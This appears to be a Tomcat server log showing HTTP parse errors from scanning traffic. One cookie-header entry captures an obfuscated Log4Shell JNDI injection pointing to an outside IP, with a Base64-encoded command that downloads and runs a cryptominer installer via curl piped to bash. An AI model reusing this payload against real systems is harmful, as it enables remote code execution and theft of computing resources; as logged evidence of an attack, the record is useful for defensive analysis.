13-Sep-2024 00:24:19.822 INFO [http-nio-8080-exec-10] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x000x00i0x010x000x00e0x030x03U0x1c0xa70xe4random1random2random3random40x000x000x0c0x00/0x000x0a0x000x130x0090x000x040x000xff0x010x000x0000x000x0d0x00,0x00*0x000x010x000x030x000x020x060x010x060x030x060x020x020x010x020x030x020x020x030x010x030x030x030x020x040x010x040x030x040x020x010x010x010x030x010x020x050x010x050x030x05...]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:418)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:260)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
		at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:834)
13-Sep-2024 00:24:20.907 INFO [http-nio-8080-exec-7] org.apache.tomcat.util.http.Parameters.processParameters Invalid chunk starting at byte [0] and ending at byte [40] with a value of [=PHPE9568F36-D428-11d2-A769-00AA001ACF42] ignored
 Note: further occurrences of Parameter errors will be logged at DEBUG level.
13-Sep-2024 05:49:33.929 INFO [http-nio-8080-exec-6] org.apache.tomcat.util.http.parser.Cookie.logInvalidHeader A cookie header was received [('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//57.128.29.86:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0OTlhNkxNdmFtV2N1cW5XN3dtTWg1aWZMMVZTejljM1lRcDJQY2JBREZQNGFyNmFkNWV2UFZSZXdCZkZxSEhQTlhXNG9yVmVBVTFyYVV6TWVWZkJRWjN0VHA4S1pMSg==}')] that contained an invalid cookie. That cookie will be ignored.
 Note: further occurrences of this error will be logged at DEBUG level.
13-Sep-2024 06:56:30.306 INFO [http-nio-8080-exec-6] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xe40x010x000x000xe00x030x030xe00xf5_k0xab0x970xdc0xab0xffw0xde0xe20x890xd30xd60x01jF0xf40x090x1ci0x070x9cfB0x0c0x04*0x96_0x8b]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:418)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:260)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
		at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:834)
13-Sep-2024 19:28:53.146 INFO [http-nio-8080-exec-2] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x060xe00x010x000x060xdc0x030x03i0xeeW0x7f0xc20xe50x140xb9j0x86U0xb70xfd0xe30xb70x190x0d~##0xad0xd10xf2F0xf0D0x030xe80xd50x840x81_]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:418)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:260)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
		at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:834)
